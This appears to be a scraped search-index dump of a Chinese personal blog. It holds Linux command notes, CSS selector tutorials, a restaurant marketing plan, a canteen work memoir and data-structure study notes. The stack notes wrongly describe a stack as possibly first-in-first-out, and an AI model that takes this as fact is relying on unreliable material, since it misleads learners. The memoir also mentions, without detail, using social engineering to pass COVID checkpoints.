改变文件所有者 chown 12chown 用户名 文件或目录chown root aa 改变文件所属组 chgrp 12chgrp 用户组 文件或目录chgrp root aa 查看当前日历 cal 12calcal -y #查看一年的日历 显示或设置时间 date 1date 查看进程信息 ps 1ps -aux 可以不用加- -a显示所有进程,包括其他用户进程 -u显示进程的详细信息 -x 显示没有控制终端的进程 -w显示加宽,以便显示更多的详细 USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND USER 用户名 PID 进程ID %CPU 进程占用的CPU百分比 %MEM 占用内存的百分比 VSZ 该进程使用的虚拟內存量（KB） RSS 该进程占用的固定內存量（KB）（驻留中页的数量） TTY //该进程在哪个终端上运行，若与终端无关，则显示? 若为pts/0等，则表示由网络连接主机进程。 STAT 进程的状态 START 该进程被触发启动时间 TIME 该进程实际使用CPU运行的时间 COMMAND:所执行的指令 动态显示进程信息 top 1top 结束进程 kill 12kill 进程idkill -9 进程id #强制结束 后台运行 &amp;、jobs、fg 12345 ./hello.exe &amp; #表示后台运行 jobs #查看后台程序 fg 后台编号 #把后台程序调出前台 关机重启 reboot shutdown init 1234567reboot #重启shutdown -r now #重启shutdown -h now #立刻关机shutdown -h 20:25 #在20:25分关机shutdown -h +10 #十分钟后关机init 0 #关机init 6 #重启 字符界面和图像界面切换 redhat平台 12init 3 #字符界面init 5 #图形界面 Ubuntu快捷键切换 ctrl+alt+F2 字符界面 ctrl+alt+F1 图像界面 检测硬盘空间 df 1df -h 检查目录所占磁盘空间:du 1du -h 目录 -a 递归显示指定目录中各文件和子目录中文件占用的数据块 -s 显示指定文件和目录占用的数据块 -b 以字节为单位显示磁盘占用情况 -h人性化输出大小 安装软件 rpm rpm [选项][软件包名] -i指定安装的软件包 -h显示安装过程及进度 -v 显示安装的详细信息 -q查询系统是否已安装指定软件包 -a 查看系统已安装的软件包 -e 卸载软件 --nodeps 配合-e使用 ,强制卸载,不检查依赖项 --force 强制操作,如强制安装或卸载 1rpm -ihv ./aaa.rpm 获取最新的软件包的列表 1sudo apt-get update 从源中添加xxx软件 1sudo apt-get install xxx 删除xxx软件 1sudo apt-get remove xxx dpkg Debian Linux系统用来安装、创建和管理软件包的实用工具。 语法 dpkg(选项)(参数) 选项 -i：安装软件包； -r：删除软件包； -P：删除软件包的同时删除其配置文件； -L：显示于软件包关联的文件； -l：显示已安装软件包列表； --unpack：解开软件包； -c：显示软件包内文件列表； --confiugre：配置软件包。 参数 Deb软件包：指定要操作的.deb软件包。 实例 12345678910dpkg -i package.deb #安装包dpkg -r package #删除包dpkg -P package #删除包（包括配置文件）dpkg -L package #列出与该包关联的文件dpkg -l package #显示该包的版本dpkg --unpack package.deb #解开deb包的内容dpkg -S keyword #搜索所属的包内容dpkg -l #列出当前已安装的包dpkg -c package.deb #列出deb包的内容dpkg --configure package #配置包","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"属性选择器","slug":"html-css00022属性选择器","date":"2020-06-04T04:39:16.000Z","updated":"2020-06-04T04:56:52.137Z","comments":true,"path":"2020/06/04/html-css00022属性选择器/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/06/04/html-css00022属性选择器/","excerpt":"","text":"属性选择器 在HBuilder中按ctrl+shift+f可以折叠代码 title属性 可以给标签起一个标题名字 鼠标放上去会显示属性值 1&lt;p title=\"123\"&gt;zzz&lt;/p&gt; 元素名[属性名] 选择含有指定属性的元素 123456p[title]&#123;color: yellow;&#125;p[class]&#123;color: yellow;&#125; 元素名[属性名=属性值] 选择含有指定属性和属性值的元素 123456p[title=\"123\"]&#123;color: yellow;&#125;p[class=\"111\"]&#123;color: yellow;&#125; 元素名[属性名^=属性值] 选择属性值以指定值开头的元素 123456p[title^=\"a\"]&#123;color: yellow;&#125;p[class^=\"b\"]&#123;color: yellow;&#125; 元素名[属性名$=属性值] 选择属性值以指定值结尾的元素 123456p[title$=\"a\"]&#123;color: yellow;&#125;p[class$=\"b\"]&#123;color: yellow;&#125; 元素名[属性名*=属性值] 选择属性值中含有某值的元素的元素 123456p[title*=\"a\"]&#123;color: yellow;&#125;p[class*=\"b\"]&#123;color: yellow;&#125; 123456789101112131415161718192021222324252627282930313233343536373839&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;style type=\"text/css\"&gt; p[class]&#123; background-color: yellow; &#125; p[title=\"a\"]&#123; background-color: red; &#125; p[title^=\"ac\"]&#123; background-color: green; &#125; p[title$=\"bc\"]&#123; color: red; &#125; p[title*=\"z\"]&#123; color: brown; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;p title=\"acc\"&gt;123&lt;/p&gt; &lt;p title=\"acc\"&gt;123&lt;/p&gt; &lt;p title=\"abc\"&gt;123&lt;/p&gt; &lt;p title=\"abc\"&gt;123&lt;/p&gt; &lt;p title=\"a\"&gt;123&lt;/p&gt; &lt;p class=\"bc\"&gt;123&lt;/p&gt; &lt;p class=\"bc\"&gt;123&lt;/p&gt; &lt;p title=\"azs\"&gt;123&lt;/p&gt; &lt;p title=\"aza\"&gt;123&lt;/p&gt; &lt;p title=\"azc\"&gt;123&lt;/p&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"伪元素","slug":"html-css00021伪元素","date":"2020-06-04T04:12:31.000Z","updated":"2020-06-04T04:27:13.487Z","comments":true,"path":"2020/06/04/html-css00021伪元素/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/06/04/html-css00021伪元素/","excerpt":"","text":"伪元素 :first-letter 首字符伪元素 修改第一个字符的样式 12元素名:first-letter&#123;&#125; :first-line 首行伪元素 修改首行的样式 12元素名::first-line&#123;&#125; :before 表示元素最前面部分 :before和:after通常搭配content来使用 123p:before&#123;content: \"2133\";&#125; :after 表示元素最后面 123p:after&#123;content: \"2133\";&#125; 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;style&gt; p:first-letter&#123; color: red; font-size: 50px; &#125; p:first-line&#123; background-color: saddlebrown; &#125; p:before&#123; font-size: 50px; content: \"www\"; &#125; p:after&#123; font-size: 50px; content: \".com\"; color: green; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;12342112423141242&lt;/p&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"元素的伪类选择器","slug":"html-css00020元素的伪类选择器","date":"2020-05-30T11:43:22.000Z","updated":"2020-05-30T12:01:39.341Z","comments":true,"path":"2020/05/30/html-css00020元素的伪类选择器/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/05/30/html-css00020元素的伪类选择器/","excerpt":"","text":"元素的伪类选择器 伪类专门用来表示元素的一种特殊的状态. 比如访问过的超链接等 :link表示普通的链接（没访问过的超链接） 123a:link&#123;color:yellow;&#125; :visited表示访问过的超链接 浏览器是通过历史记录来判断一个链接是否访问过. 由于隐私的原因，所以visited这个伪类只能修改链接的颜色 123a:visited&#123;color:red;&#125; :hover表示鼠标移入的状态 123a:hover&#123;color:red;&#125; :active表示的是超链接被点击的状态. 123a:active&#123;color:red;&#125; :hover和:active也可以为其他元素设置 123456p:hover&#123;color:red;&#125;p:active&#123;color:red;&#125; IE6中,不支持对超链接以为的元素设置:hover和:active :focus获取焦点 123input:focus&#123;background-color:yellow;&#125; ::selection为p标签中选中的内容使用样式 可以用::selection伪类 注意:这个伪类在火狐浏览器中需要采用另外一种方式编写::-moz-selection 123456p::-moz-selection&#123;&#125;p::selection&#123;&#125;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"后代选择器和子元素选择器","slug":"html-css00019后代选择器和子元素选择器","date":"2020-05-30T09:52:56.000Z","updated":"2020-05-30T10:04:18.151Z","comments":true,"path":"2020/05/30/html-css00019后代选择器和子元素选择器/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/05/30/html-css00019后代选择器和子元素选择器/","excerpt":"","text":"后代选择器和子元素选择器 父元素 直接包含子元素的元素叫做父元素 子元素 直接被父元素包含的元素是子元素 祖先元素 ​ 直接或间接包含后代元素的元素叫做祖先元素 ​ 一个元素的父元素也是它的祖先元素 后代元素 ​ 直接或间接被祖先元素包含的元素叫做后代元素 ​ 子元素也是后代元素 兄弟元素 拥有相同父元素的元素是兄弟元素 后代元素选择器 作用：选中指定元素内的指定后代元素 语法： 12祖先 后代&#123;&#125; 12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;style&gt; div span&#123; background-color: red; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; &lt;span&gt;我是div的后代&lt;/span&gt; &lt;p&gt;我也是div的后代&lt;/p&gt; &lt;p&gt;&lt;span&gt;我span也是div的后代&lt;/span&gt;&lt;/p&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 子元素选择器 ​ 作用：选中指定父元素的指定子元素 ​ 语法： 123父元素&gt;子元素&#123;&#125; 123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;style&gt; div&gt;span&#123; background-color:red; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; &lt;span&gt;我是div的直接子元素&lt;/span&gt; &lt;p&gt;&lt;span&gt;我span不是div的直接子元素&lt;/span&gt;&lt;/p&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"关于MoTa利用互联网","slug":"关于摩打利用互联网的战略","date":"2020-05-09T15:02:07.000Z","updated":"2020-05-09T17:24:44.044Z","comments":true,"path":"2020/05/09/关于摩打利用互联网的战略/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/05/09/关于摩打利用互联网的战略/","excerpt":"","text":"关于MoTa利用互联网 摩打需要拥有自己的官方网站以及公众号 以下内容并非固化思维，可自行天马行空，增加或减少选项。 官方网站内容 用户信息 活动信息 最新消息 菜品展示 预定系统 支付系统 招聘信息 积分系统 会员系统 用户信息: 收集客户的姓名,电话,性别，生日 活动信息: 展示关于摩打新出的活动,吸引客户参与. 最新消息: 摩打有新出的菜式或与其相关的消息 菜品展示: 可以将摩打的所有菜品的图片都发布到网站，供客户参考并选择。 预定系统： 给客户提供预约服务，可提前一星期以内或更久的预定。 需要用户给出预定的时间，以及菜品。 需要用户给出定金或菜品全金。 如果用户到点未到，可根据情况作出部分退款 优势：客户到点就可马上就餐，缩短客户等待的时间 缺点：客户已预约且未到的情况，需要有一套方案去处理 支付系统： 可以在网站接如第三方平台的支付，如支付宝，微信，银联。 技术性要点： 支付成功：我们官方平台需要做些相应处理 招聘信息： 可在官方网站发布人才招聘信息。 积分系统： 假设用户累计到XXX分，可以赠送指定菜品或物品 积分衰减（可选）：如果用户在指定时间内（月或季度）未来本店消费，将衰退一定的积分。 积分可以是1元=1积分，或x元 = y积分（根据情况来定制） 会员系统： 每个新用户或老用户都可以免费成为新会员。 会员可分等级，等级越高，享受到的优惠越多。 等级可按照用户总消费金额上下浮度来决定。 会员系统与积分系统交互使用，既会员系统包含积分系统 会员等级可按照月或季度衰减或增加。 挽留老客户以及吸引新用户 挽留老用户： 先保证服务质量以及菜品质量 新鲜感 惊喜度 客户口味信息 天下没有吃不腻的食物，唯有吃不腻的创新，所以需要不断创新 感受度（如环境、温度等） 吸引新用户（可用于外卖）： 充分平台吸引： 可利用官方网站，公众号，淘宝，美团，饿了么等平台（最好是广州市区的，其他市区的也可，但这是伏笔）。 从老客户中挖掘新客户： 例如： 老客户介绍了一名新客户来本店消费，可以赠送折惠劵或现金劵、积分等奖励。 这需要有一套完整的电子系统支撑，以防止客户作弊 新用户被登记后便自动成为老用户，如上所述，老用户可介绍新用户 活动性吸引 写一篇关于介绍摩打的文章，散播到朋友圈，要求客户转发的文章点赞数量达到我们的要求，可赠送xxx菜品或礼物、优惠劵、积分等，每天需要限制人数，如前X名达到我们要求且先到达门店的客户才可享受前面所述的活动。达到点赞数目却不是最先前X名到达门店的可赠送某些物品或获得少量积分等。 限时或限数量抢购： 新出的菜品或xxx菜品打折,可限制时间或数量。 策划指定节假日活动 根据店面人员已经情况策划。 打折与免单活动（需要微信小程序支撑）： 活动要求： 在本店正在消费的客户 在规定的时间内，客户转发本店文章，并且该文章已让客户的朋友阅读数量达到xxx 限制免单名额和打折名额。如免单名额一天为X个，打折名额一天为Y个 每天公开前一天的免单名单以及打折名单（打消客户的质疑度，可建立一个当天所有用户的微信群，在群里发布消息，这样可以方便发布二次推广） 食品网站参考： 海底捞 https://www.haidilao.com/zh/gyhdl/index.html 肯德基 http://www.kfc.com.cn/kfccda/index.aspx 必胜客 http://www.pizzahut.com.cn/ 星巴克 https://www.starbucks.com.cn/ 网站开发渠道: 一般商家会根据你的要求提供一条龙技术服务的。 预估价格1k以内或1k~2k之间。 上面所述的可自行增加、删除与采纳、且所有的前提在于服务质量与菜品质量","categories":[],"tags":[]},{"title":"在某某食堂的经历","slug":"在某某食堂的经历","date":"2020-05-06T17:55:39.000Z","updated":"2020-05-11T18:35:42.887Z","comments":true,"path":"2020/05/07/在某某食堂的经历/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/05/07/在某某食堂的经历/","excerpt":"","text":"如果使用手机观看，在文章接近末尾时，请使用横屏阅读。以避免排版结构错误！ 事情的开始 原本打算2020年成立的工作室的，可造化弄人啊。千算万算，还是算漏了天灾。所以导致我们的工作室一直迟迟开不起来。就这样我在家里一直待到三月份才回广州，我自己意识到这个时候想进公司还是有点困难的，因为目前很多公司都裁员了，就连教育行业兄弟连公司也倒闭了。所以我只能先随便找一份工作让自己先生存下来。 回到广州的时候，广州还是属于一级防护，很多村子都封了，外地人基本都进不去。那时候可把我愁坏了，因为很多旅店都是要进村的，还好最后还是被自己混进去了，然后拿到某个村子的通行证。这也多亏了自己学过社会工程学。其实感觉很矛盾，就算拿到了一个村子的通行证，证明了自己是健康的，当去其他村的时候还是不能进。 在住旅店的这段时间找了很多工作，其实这些工作很多都是工厂和服务员的，没办法，我回来的时候还没有正式开始复工。我面试了很多工作，第一份是仓库管理的，后面因为某些原因就没去了。后面我朋友介绍了一份某某食堂服务员的工作给我，面试我的是一位叫小萱的小姐姐，那时候我们还是在线面试的，开视频的时候，就问了一些问题，之后就叫我们去办健康证了，再之后就是让我们去总部培训，培训的时候那叫一个精彩呀，满满的鸡汤和大饼（自己百度）。 入职的第一天 当我踏进某某食堂的第一步的时候，我觉得这里面的人都很好呀，特别是我们的店长，那个笑脸真的让人意外的感觉到亲切的感觉。 上岗的时候，楼面的李某某主管就安排了我补家私，然后家私没有补完就叫我去洗毛巾，洗完毛巾之后叫我去收桌，收桌之前一个叫啊西的经理和李某某主管一直强调说我们这里要的是效率，效率，效率，这时我心里那个叫惨呀。 其实我感觉日企文化的公司都很干净，我们收桌的时候要带黄色的一次性手套，而弄食材的时候必须带透明的手套，因为疫情期间嘛，这方面我感觉到了人性化，为员工着想的同时，也给顾客带来了健康。唯一的缺点是规矩真的很多，很多规矩都是很死板的，这也是我一直不想进入日企或日企文化公司的原因。没办法我还是来了。随后我发现，天啊，这里的桌是收不完的，从上班一直收到下班，我心里那个叫苦呀，可能是之前没有做好心理准备吧。随后又发现，每当遇见阿西的时候，她都会对我说加油哦。我心想，我会不会以后听到加油两个字都毛骨悚然呀。不过这里的正能量还是挺多的。感觉来到这里，就是再重温一遍学生会的感觉。比如见到人就要打招呼，哪怕是见到我们内部的员工也是要打招呼，发现某个员工的错误马上就指出来（这与其他职场完全不一样）有些地方是不会当面马上大声的指出来的，因为怕得罪人嘛。特别是在有管理层的人在旁边的时候，这样会让犯错误的那个同事很难堪的，表面上是不会怨恨，可背后呢？谁也不敢保证吧？这里也是对一个人情商的一个大考场地。 亮点 这里的服务与普通餐饮的行业相比，可以说是所向披靡的。 卫生方面在我所接触过的餐饮行业中也是数一数二的。 小伙伴累的时候，某些管理层会给小伙伴一罐红牛或者营养快线，这点心里还是会觉得自己的付出还是有被认可的。被认可不一定是给物质，还可以是精神上的认可。比如说xxx你今天表现得很棒哦！你今天的努力，我都有看到哦。 大部分小伙伴都很热情。 很多小伙伴都很上进,虽然 有些时候上进的方式缺少了情商的方式，但拥有上进的心就是一种正能量，能量是会传递的。 管理层的人都比较友善，没有一副高高在上的感觉，这点是我最欣赏的地方，因为现实中很少这样的管理者。 大波店长的笑容可以治愈每个人的心，每当不开心时，他的笑容都能让人觉得很欣慰。因为工作中总会积累到一些负面的情绪，可他这么一笑，所有的负面都烟消云散了，在职场上，一位领导对你的微笑意味着对你的认可，虽然不知道他的笑意是什么，但总要往好处想嘛。人们常说微笑是一种无穷大的能量，它可以让你战胜一切，所向披靡。 还有很多很多，我就先省略掉吧！ 缺陷 为什么这里的女生厕所要男生去洗，这对男员工心理不舒服的同时还给顾客带来不舒服。每次搞完厕所出来的时候，遇到哪些女顾客时，她们都会带着一种异样的眼光看着我们。难道某某食堂这里没有女生吗？我还记得有一次，我搞完厕所出来的时候，有一位女生很大声的说，“咦，女厕所居然有男生的”，这时候我心里贼尴尬呀。 这里的员工餐贼不公平，除了第一批吃的，其他批次吃时可能渣都没有了，更别说最后一批了。我提前半个小时公司了，发现菜和饭一点都不剩了，这还是人做的事情么？然后让我挨饿上班工作，还好一位叫鱼子酱的去熟食窗口那里打了一位饭并且反应给啊西经理让她让我去休息室吃。要不然我还真担心自己会饿晕在那里。 某位经理说我没有融入进这群伙伴里，其实我觉得这不是一个人的问题吧，毕竟一个巴掌是拍不响的。他们老员工不接纳我们这些新员工，我们不管做什么都融入不进去呀。 我发现这里收桌的人都是最低等最低贱的，恰好我就是那个收桌的。任何人都可以指挥我们这个岗位的人去做事，哪怕这些不在我们份内的事，还是要我们做。叫我们帮他们很容易，叫他们帮我们那个叫困难呀。 某位经理真的是用人千疑啊，有一天肚子不舒服，两个小时上了两次厕所，他居然说怎么你又上厕所，天天上厕所。我杀人的心都有了，怀疑人家偷懒就直说嘛。 停下来就是闲的。有一次忙得不可开交了，好不容易停下来站了一会，某位经理上来就直接说，你这么闲，去扫一下地。这时心里一万句cnm啊，我忙的时候，你的眼睛去哪里了？莫非是被卖冰棍的老太太当冰块串起来了？ 刚刚入职工作的第三天，没有人教我们看班表，直接就发一张图片过来，然后第二天就问我们为什么没上班 ，我们一脸懵逼呀。鬼知道那张图片是要来干嘛的？ 普通员工的事情，管理层的人不上心。最记得的是宿舍的WiFi永远都是马上就来装的，结果一天拖一天，一直拖了大半个月才装好。如果是这样，直接就说公司不装宿舍WiFi嘛。 管理层的意见没有统一化，比如收夜最后补家私的时候有些经理说全部要补进消毒柜，有些经理说只补筷子勺子，和酱油碟就可以了。这样我们听谁的？ 啊姨放家私的窗口永远都是有零碎的家私。 厨余垃圾的那个桶永远都是有生活垃圾的。只要收桌的人离开一会回来马上就能看到有生活垃圾了。然后我们每次都要伸手进厨余垃圾桶里捡起来，所以我们收桌的小伙伴还有另外一个称呼“捡垃圾的垃圾佬”。 有一次有一位小伙伴不小心把家私弄掉了，刚刚好砸在我头上，当时那个叫疼啊，然后某位经理就催我快点收桌，我都和他说了我被砸到头了，他还再催我去收桌，当时觉得超级憋屈呀。如果不是因为差不多到离职那天了，我绝对会当场发飙的。 下班搞卫生的时候，安排到我扫地，我就拿出手机来照着地上来扫，有个叫渣女就不断的讽刺，说哇你好认真哦，扫个地还用电筒照着。我都是打算要走的人了，是和你抢功劳呢？还是怕我和你竞争升职呢？我都一而再再而三的忍让她了，她还咄咄逼人，最后我还是爆发了，这是我来这某某食堂以来第一次发的脾气。说实话我本来就不容易发脾气的人，能把我逼到这种地步的人还真的是人才啊。 感觉这里的物料老是不足，例如 黄色手套，早几天前都说了手套快没了，还没用完了之后还没有买回来，然后不知道怎么突然又找到几包暂时能支撑着，谁知道他们还不会亡羊补牢，是不是每次都要等到危机来临的时候才去处理呢？这些是谁的责任呢？哪怕手套这些是采购买的，但管理层领导的工作是什么？带领好自己手下的同时是不是应该和其他部门交接好呀？ 有一次一位叫啊西的管理层领导叫我去女厕所搞卫生，搞完之后要拍照发在钉钉那个群上。刚刚好我搞完卫生拍好照走出去门口准备把照片发在钉钉上的时候，另外一位管理层的就马上说我玩手机了，根本就没有解释的机会，我只能说这个管理层领导也是个人才（蠢材）。 在我离职的那段时间，那些管理层的一直安排我收桌，收桌就算了。有一次整个场子就我一个收桌的，场子分三个区嘛，分别是ＡＢＣ区，Ａ区称为内场，因为内场一直很忙，收桌一直收个不停，吃宵夜的时候Ｃ区的小伙伴就开始抱怨我了，她说：我是不是得罪你了？为什么一直不过来Ｃ区收桌啊。这时我那个叫憋屈啊，我在内场忙得冒烟了，哪里还有时间去Ｃ区收桌啊！真的当我会分身啊？ E区真的很搞笑,每次下大雨都会淹水，这个问题其实也不是很复杂，既然不能改变建筑的结构，但可以软性的去解决问题。例如买些隔水的物品回来，如果每次下雨都让客人湿鞋或在水中进食，可想而知，这给客人的体验感是多差，这也是潜在的客户流失的存在。问题往往只有那么一两个，但解决问题的方法却可以有千万种。 最后的个人总结与感慨 上述的文字言语或许会比较偏激，这其中我自身也是有问题的，因为我缺乏在这里上进的动力，所以一直都很消沉。我的光芒也并没有在这里展现出来，因为这不是我的舞台。其实这里面大部分的同事都是蛮可爱的，还没有被尘世染化，正是他们的这份纯情的天真，才能勾起我曾在学生时代学生会的点点滴滴。可惜我不再是过往的那个我，而他们也不是我曾经的小伙伴。到最后我才发现最开始啊西总是对我喊的那句“加油哦！”并没有成为我心里最恐惧的话，而成为了我最难以忘怀的能量源泉。我知道自己是一个非常容易陷入感情却又难以自拔的人，所以我一直很抗拒自己的社交，所以这一次我狠下了心，并不想和他们有深入的交情。其实也挺矛盾的，明明不想成为这样的人，可却要伪装成这样的人，现在想想还是挺可笑的。我很清楚每个地方都会有矛盾、明中暗斗、误会等。但这并不影响他们的可爱。最后我还是没有留下点什么，悄然的离开了这个我最不喜欢也最不讨厌的地方。 假若有缘，我想我们还是不见了吧！ 祝愿你们前程似锦，面对困难不畏不惧。 记得要把微笑常挂在脸上哦！ 因为你们真的真的很可爱！ (*^o^)(^o^*) 最后我要对彩虹、小劳、西红柿、鱼子酱、文庆，博锐、肥龙、小弟，说声谢谢，你们身上各自的光芒，成功的留在了我的心里。当然不能忘记了我们的浩业大哥！大人物嘛总是要最后出场的。哈哈哈！","categories":[],"tags":[]},{"title":"算法","slug":"006算法","date":"2020-04-30T05:24:52.000Z","updated":"2020-05-08T17:45:29.234Z","comments":true,"path":"2020/04/30/006算法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/30/006算法/","excerpt":"","text":"算法 查找与排序技术 顺序查找 顺序表又称为顺序搜索。 从表中的第一个元素开始比较，若相等则查找成功，若元素不存在，则查找失败。 当一个线性表的长度为n时，最坏情况下，查找一个元素需要比较n次 二分查找法 二分查找只适用于顺序存储的有序表。 步骤： 将x与线性表的中间元素进行比较： 若中间元素的值等于x，则说明查找成功，查找结束 若x小于中间元素的值，则在线性表的前半部分以相同的方法查找。 若x大于中间元素的值，则在线性表的后半部分以相同的方法查找。 这个过程一直进行到查找成功或子表长度为0（说明线性表中没有这个元素）为止。 最糟糕的情况需要查找log2n次。 交换类排序法 冒泡排序 通过相邻数据元素的交换逐步将线性表变成有序的。 从前往后，然后从后往前比较并交换元素。 最坏情况时要比较n(n - 1)/2 次，n代表线性表的长度。 快速排序 快速排序法是对冒泡排序法的改进，又叫作分区交换排序法。 基本思想如下： 从线性表中任意选取一个元素（通常选第一个元素），设为T，将线性表中小于T的元素移到T的前面，而大于T的元素移到T的后面，结果就将线性表分成了两部分（称为两个子表），T处于分界线的位置处，这个过程称为线性表的分割。通过对线性表的一次分割，就以T为分界线，将线性表分成了前后两个子表，且前面子表中的所有元素均不大于T，而后面子表中的所有元素均不小于T，然后用同样的方法对分割后的子表进行快速排序，直到各个子表的长度为1为止。 插入类排序法 简单插入排序法 简单插入排序法也叫直接插入排序法。 插入排序是指将无序序列中各元素依次插入到已经有序的线性表中。 希尔排序法 希尔排序法（Shell Sort）又称缩小增量排序法，它对简单插入排序做了比较大的改进。 其方法如下： 将整个无序序列分割成若干小的子序列分别进行简单插入排序。 时间复杂度: O（n1.5） 堆排序法 每个父节点同时大于等于两个子结点或每个父结点同时小于等于两个子结点的结构成为堆 时间复杂度: O（ nlog2n ） 考点总结 二分法查找只适用于顺序存储的线性表，且表中的元素必须按关键字有序（升序，但允许相邻元素值相等）排列； 在长度为n的有序线性表中进行二分查找其时间复杂度为O（ log2n ）。 交换类 冒泡排序：n(n-1)/2 快速排序：n(n-1)/2","categories":[{"name":"计算机公共基础","slug":"计算机公共基础","permalink":"https://xiaowuyoucy.github.io/categories/计算机公共基础/"}],"tags":[]},{"title":"树与二叉树","slug":"005树与二叉树","date":"2020-04-27T18:05:59.000Z","updated":"2020-04-27T19:31:29.546Z","comments":true,"path":"2020/04/28/005树与二叉树/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/28/005树与二叉树/","excerpt":"","text":"树与二叉树 树的基本概念 树（tree）是一种非线性结构。在树这种数据结构中，所有数据元素之间的关系具有明显的层次特点。 每一个结点只有一个前件，称为父结点。 没有前件的结点称为根节点。 每一个结点都可以有多个后件，它们都称为该结点的子结点。 没有后件的结点称为叶子结点。 一个结点所拥有的后件的个数称为该结点的度。 所有结点中的最大的度称为树的度 以某结点的一个子结点为根构成的树称为该结点的一棵子树。 叶子结点没有子树。 二叉树 二叉树的基本概念 二叉树的特点： 非空二叉树只有一个根结点 每一个结点最多有两棵子树，且分别称为该结点的左子树与右子树。 满二叉树与完全二叉树 满二叉树与完全二叉树是两种特殊的二叉树。 满二叉树 在一棵二叉树中，如果所有分支结点都存在左子树和右子树，并且所有叶子结点都在同一层上，这样的二叉树称为满二叉树。 完全二叉树 完全二叉树是指最后一层外，每一层上的结点数均达到最大值，而在最后一层上只缺少右边的若干结点。 满二叉树也是完全二叉树，而完全二叉树不一定是满二叉树 二叉树的基本性质 性质1：在二叉树中，第i层的结点数最多为2i-1个（i≥1） 性质2：在深度为k的二叉树中，结点总数最多为2k-1个（k≥1）。 性质3：对任意一棵二叉树，度为0的结点（既叶子结点）总是比度为2的结点多一个。 性质4： 具有n个结点的二叉树，其深度至少为[ log2n ] + 1，其中[log2n]表示取log2n的整数部分。 具有n个结点的完全二叉树的深度为[log2n]+1。 二叉树的存储结构 二叉树通常采用链式存储结构。 用于存储二叉树中各元素的存储结点。 由两部分组成：数据域与指针域。 二叉树遍历 按一定的次序访问二叉树中的每一个结点,使每个结点被访问一次且只被访问一次。 二叉树的遍历分为三种： 前序遍历 中序遍历 后序遍历 D，L，R D代表访问根结点 L代表遍历根节点的左子树 R代表遍历根节点的右子树 前序遍历：D L R 中序遍历：L D R 后序遍历：L R D 前序遍历(DLR) 先访问根节点，然后遍历左子树，最后遍历右子树；并且，在遍历左、右子树时，仍然先访问根结点，然后遍历左子树，最后遍历右子树。 前序遍历结果：ABDGCEHIF 中序遍历（LDR）： 首先遍历左子树，然后访问根节点，最后遍历右子树；并且，在遍历左、右子树时，仍然先遍历左子树，然后访问根结点，最后遍历右子树。 中序遍历结果:DGBAHEICF 后序遍历(LRD) 首先遍历左子树，然后遍历右子树，最后访问根节点；并且，在遍历左、右子树时，仍然先遍历左子树，然后遍历右子树，最后访问根结点。 后序遍历结果:GDBHIEFCA 考题 扇入代表前件 扇出代表后件","categories":[{"name":"计算机公共基础","slug":"计算机公共基础","permalink":"https://xiaowuyoucy.github.io/categories/计算机公共基础/"}],"tags":[]},{"title":"栈和队列","slug":"004栈和队列","date":"2020-04-25T03:17:47.000Z","updated":"2020-04-25T04:01:10.244Z","comments":true,"path":"2020/04/25/004栈和队列/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/25/004栈和队列/","excerpt":"","text":"栈和队列 栈及其基本运算 栈的基本概念 栈（stack）是限定仅在一端进行插入和删除运算的线性表。 在栈中，允许插入与删除的一端称为栈顶，而不允许插入与删除的另一端称为栈底。 栈的入口和出口是同一个口。 top=bottom=0的时候，说明栈是空的。 栈的基本运算 入栈，退栈与读栈顶元素。 入栈运算 入栈运算是指在栈顶位置插入一个新元素。 有两个基本操作： 将栈顶指针加1，top=top+1； 然后将新元素插入栈顶指针指向的位置； 退栈运算 取出栈顶元素，并赋值给某个变量 两个基本操作： 将栈顶元素赋值给变量 然后栈顶指针减1，top=top-1 读栈顶元素 将栈顶元素赋值给一个指定的变量且栈顶指针不会改变。 总结 栈是按照“先进后出”或先进先出的原则组织数据的线性表 在栈的入栈和退栈的运算当中，栈底指针bottom维持不变。 因为栈能保存数据，因此栈具有记忆作用 栈内的元素个数计算：|TOP-BOTTOM|+1,其中BOTTOM&gt;=1,如果栈当中TOP=BOTTOM=0说明栈是空的 栈是线性结构，在计算机中担当着临时存储的功能。 队列及其基本运算 队列的基本概念 队列（queue）是限定仅在表的一端进行插入，而在表的另一端进行删除的线性表。 在队列中，允许插入的一端称为队尾，允许删除的一端称为队头。 